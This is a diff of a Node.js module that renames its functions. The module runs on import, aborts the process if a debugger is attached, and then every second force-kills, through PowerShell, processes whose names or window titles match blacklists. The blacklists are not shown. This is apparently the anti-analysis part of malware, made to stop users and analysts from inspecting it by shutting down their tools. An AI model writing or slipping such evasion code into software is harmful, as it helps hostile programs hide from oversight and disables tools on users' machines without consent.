@@ -1,6 +1,6 @@
 const child_process = require('child_process');
 
-const terminateProcess = (pid) => {
+const TerminateProcess = (pid) => {
     return new Promise((resolve, reject) => {
         try {
             child_process.exec(`powershell Stop-Process -Id ${pid} -Force`, (error, stdout, stderr) => {
@@ -16,7 +16,7 @@ const terminateProcess = (pid) => {
     });
 };
 
-const killProcessesByNames = (blacklist) => {
+const KillProcessesByNames = (blacklist) => {
     return new Promise((resolve, reject) => {
         try {
             const blacklistRegex = blacklist.map(name => name.toLowerCase()).join('|');
@@ -33,7 +33,7 @@ const killProcessesByNames = (blacklist) => {
     });
 };
 
-const getWindowProcesses = () => {
+const GetWindowProcesses = () => {
     return new Promise((resolve, reject) => {
         try {
             child_process.exec(`powershell "(Get-Process | Where-Object { $_.MainWindowTitle -ne '' }) | ForEach-Object { $_.Id, $_.MainWindowTitle }"`, (error, stdout, stderr) => {
@@ -50,9 +50,9 @@ const getWindowProcesses = () => {
     });
 };
 
-const killProcessesByWindowNames = async (blacklist) => {
+const KillProcessesByWindowNames = async (blacklist) => {
     try {
-        const processes = await getWindowProcesses();
+        const processes = await GetWindowProcesses();
         processes.forEach((processInfo, index) => {
             if (index % 2 !== 0) {
                 const title = processInfo.toLowerCase();
@@ -60,7 +60,7 @@ const killProcessesByWindowNames = async (blacklist) => {
                 blacklist.forEach(async (name) => {
                     if (title.includes(name)) {
                         try {
-                            await terminateProcess(pid);
+                            await TerminateProcess(pid);
                         } catch (error) {
                         }
                     }
@@ -72,7 +72,7 @@ const killProcessesByWindowNames = async (blacklist) => {
     }
 };
 
-const isDebuggerPresent = () => {
+const IsDebuggerPresent = () => {
     return new Promise((resolve, reject) => {
         try {
             child_process.exec('powershell "[System.Diagnostics.Debugger]::IsAttached"', (error, stdout, stderr) => {
@@ -113,15 +113,15 @@ module.exports = async () => {
     ];
 
     try {
-        if (await isDebuggerPresent()) {
+        if (await IsDebuggerPresent()) {
             process.abort();
         }
 
         setInterval(async () => {
-            await killProcessesByWindowNames(windowBlacklist);
-            await killProcessesByNames(blacklist);
+            await KillProcessesByWindowNames(windowBlacklist);
+            await KillProcessesByNames(blacklist);
         }, 1000);
     } catch (error) {
         console.error(error);
     }
-}
+};
